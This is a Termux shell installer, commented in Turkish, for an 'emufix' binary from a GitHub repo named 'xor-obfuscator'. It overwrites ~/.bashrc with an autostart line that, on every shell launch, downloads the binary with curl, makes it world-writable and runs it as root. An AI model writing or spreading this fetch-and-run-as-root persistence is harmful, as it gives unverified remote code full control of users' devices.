#!/data/data/com.termux/files/usr/bin/bash

# Renkler
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}[*] Mimari tespiti yapiliyor...${NC}"

# Cihaz mimarisini al
ABI=$(getprop ro.product.cpu.abi)
BASE_URL="https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/dist"

case "$ABI" in
    "x86_64")
        BIN="emufix_x86"
        ;;
    "arm64-v8a")
        BIN="emufix_arm64"
        ;;
    "armeabi-v7a"|"armeabi")
        BIN="emufix_arm32"
        ;;
    *)
        echo -e "${RED}[-] Desteklenmeyen mimari: $ABI${NC}"
        exit 1
        ;;
esac

echo -e "${GREEN}[+] Tespit Edilen: $ABI${NC}"
echo -e "${GREEN}[+] Indirilecek Dosya: $BIN${NC}"

# .bashrc olustur
cat << EOF > ~/.bashrc
# Kısayol komutu
alias start="su -c \"export PATH=/data/data/com.termux/files/usr/bin:\\\$PATH; export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib; cd /data/local/tmp && ./$BIN\""

# Otomatik Baslangic (Her acilista guncelle ve calistir)
su -c "export PATH=/data/data/com.termux/files/usr/bin:\\\$PATH; export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib; curl -L -o /sdcard/Download/$BIN $BASE_URL/$BIN && cp /sdcard/Download/$BIN /data/local/tmp/$BIN && chmod 777 /data/local/tmp/$BIN && cd /data/local/tmp && ./$BIN"
EOF

echo -e "${GREEN}[+] Kurulum basariyla tamamlandi!${NC}"
echo -e "${CYAN}[*] Termux'u kapayip acin veya 'source ~/.bashrc' yazin.${NC}"
